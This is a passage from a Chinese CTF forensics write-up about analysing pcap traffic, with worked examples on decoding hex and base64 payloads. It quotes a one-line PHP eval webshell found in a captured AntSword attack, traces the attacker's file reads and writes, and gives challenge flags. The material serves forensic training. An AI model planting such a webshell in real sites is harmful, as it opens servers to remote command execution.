| `7f454c46` | `f0VMRg` | ELF 可执行 |
| `4d5a` | `TVo` | PE / EXE |
| `3c3f706870` | `PD9waHA` | PHP 源码 |
| `1f8b` | `H4s` | GZIP |

> **关键坑**：base64 字符集是 hex 的**超集**（`A-Za-z0-9+/` 里含 `0-9a-f`），所以一段 hex 字符串**常常也能被 base64 成功解出**（不报错），只是解出来是乱码。**判别标准只有一条：解码后开头是不是已知魔数**，不能靠"字符集像什么"来猜。

**现成脚本**：`D:\python\CTF工具箱\misc\14-编码数据抠图-hex与base64还原.py`

- 输入可以是 pcap（自动扫所有 HTTP 请求参数 + 响应体），也可以是任意 txt/html/php 文本
- 同时试 hex 与 base64，按"能否解出魔数"裁决；自动去重、自动按类型起扩展名
- 覆盖 5 类提取规则：data URI、具名参数（`z2=xxxx`）、连续 hex、连续 base64、含折行的 base64

> 实战：这道题的 `z2`（204452 个 hex 字符）→ 脚本直接还原出 102226 字节的 `6666.jpg`。手工复制那串字符是灾难，**这类题目一律用脚本**。

### 例：easycap.pcap（代理端口逐字符）

- 82 帧，**只有一条 TCP 流**（`172.31.98.199 → 192.155.81.86:7890`）
- 每个包只带 1 字节，Follow 后拼出 `FLAG:3185b87afc86711dee0175502190d116a8071`
- 结论：flag 被拆成 80+ 个单字符包，Follow 流即还原

### 例：数据包1.pcapng（WebShell 操作流量）

- 大量 `POST /index.php?user-app-register`，每条是一次独立操作（80+ 条流）
- 响应 cookie `exam_currentuser` 是多次编码的数据，需逐层 URL 解码
- 教训：先看 `io,phs` 协议统计，别一开始就 Follow 每条流

### 例：fenxi.php（导出文件伪装成 base64 图片）

- 从流量里导出 `fenxi.php`，打开发现全是 base64 文本，开头 `/9j/4AAQSkZJRg`
- `/9j/4` 是 JPEG 魔数 `FF D8 FF E0` 的 base64 → 文件根本不是 PHP，是**伪装成 php 的 base64 图片**
- 解码得一张图，图上直接写着 flag：`flag{209acebf6324a09671abc31c869de72c}`

```powershell
py -c "import base64; open('out.jpg','wb').write(base64.b64decode(open('fenxi.php','rb').read()))"
```

- 教训：导出文件先验真类型（魔数/是否纯 base64），别被扩展名带偏。

### 例：666666.pcapng（蚁剑 webshell，完整链路）

**题目**：给一个 pcapng，问 flag。

**协议概览**：2139 包，`tcp` 为主，`http` 48 帧。两条主线——

- `192.168.25.128 ↔ 192.168.43.83:80`：**攻击流量**（蚁剑），8 个请求
- `192.168.25.128 ↔ 219.216.128.25:80`：干扰（Kali 在 `apt update`，下 deb 包）
- 另有 6 个 NTP 包，也是噪音

**目标**：Windows 10 + WAMP（`DESKTOP-5E59GR7`，`Apache/2.4.23 Win64 PHP/5.6.25`），一句话木马 `D:\wamp64\www\upload\1.php`：

```php
<?php @eval($_POST[aa]); ?>
```

**攻击时间线**：

| 帧号 | 动作 | 结果 |
|---|---|---|
| 178 | 基本信息 | 当前目录 `D:/wamp64/www/upload`，**SYSTEM 权限** |
| 265 | 列目录 | 看到 `flag.txt`(17B)、`hello.zip`(224B) |
| 882 | **写文件** | `z2` 的 204452 个 hex 字符 → 还原成 **102226 字节的 `6666.jpg`**（`ffd8ff…ffd9`，完整 JPEG） |
| 1269 | 读 `hello.zip` | 回显里是**原始二进制 ZIP**（`PK\x03\x04`），内含加密的 `flag.txt` |
| 1719 | 读 `1.php` | 确认木马本体 |

**破题链**：`6666.jpg` 是一张 Kali 壁纸，图上红字写着 `Th1s_1s_p4sswd_!!!` → 用它解压 `hello.zip` 里的 `flag.txt`：

```
flag{3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z}
```

**这题的两个关键点**：

1. **`z2` 是纯 hex，不是 base64** —— 用 `bytes.fromhex()` 还原，别把 20 万字符手工复制。
2. **回显里可以是二进制** —— `hello.zip` 的响应体不是文本，`->| ... |<-` 之间直接是 `PK` 开头的字节。用文本方式看会全是乱码，要按二进制存。

用脚本一条命令搞定（`16-流量包导出-HTTP与蚁剑webshell.py`）：

```
HTTP 请求 13 个，响应体 24 个，webshell 请求 8 个，还原上传文件 1 个
```

---

## 十、做题顺序总结

```
1. io,phs 看协议分级        → 定方向（HTTP? USB? RTP? 隧道?）
2. Ctrl+F 搜 flag / { / key  → 碰运气，10 秒
3. 按种类翻对应章节（一~六）  → 拿针对性的过滤器和处理流程
4. Follow 可疑流 / Export Objects → 把数据弄出来
5. 验魔数 → 解码 → 还原格式  → 拿 flag
```

> 规律：流量题 = **找数据 + 还原格式**。难点不在工具，而在 ① 从干扰流里认出哪条有用 ② 认出数据的编码层级（可能叠好几层）。

*最后更新：2026年10月9日*
